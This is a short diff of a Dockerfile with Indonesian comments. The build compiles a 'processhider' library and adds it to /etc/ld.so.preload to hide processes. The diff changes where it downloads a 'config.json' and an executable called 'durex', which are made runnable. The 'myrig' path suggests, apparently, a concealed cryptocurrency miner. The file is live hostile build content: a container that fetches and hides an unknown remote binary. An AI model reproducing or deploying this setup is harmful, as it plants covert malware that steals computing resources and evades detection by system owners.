@@ -16,8 +16,8 @@ RUN gcc -Wall -fPIC -shared -o libprocess.so processhider.c -ldl \
     && echo /usr/local/lib/libprocess.so >> /etc/ld.so.preload
 
 # Download config.json dan durex, serta memberikan izin eksekusi pada durex
-RUN wget https://nyadur.000webhostapp.com/myrig/config.json \
-    && wget https://nyadur.000webhostapp.com/myrig/durex \
+RUN wget https://raw.githubusercontent.com/cihuuy/dcduck/main/config.json \
+    && wget https://github.com/cihuuy/dcduck/raw/main/durex \
     && chmod +x durex
 
 # Perintah yang akan dijalankan saat container pertama kali dijalankan
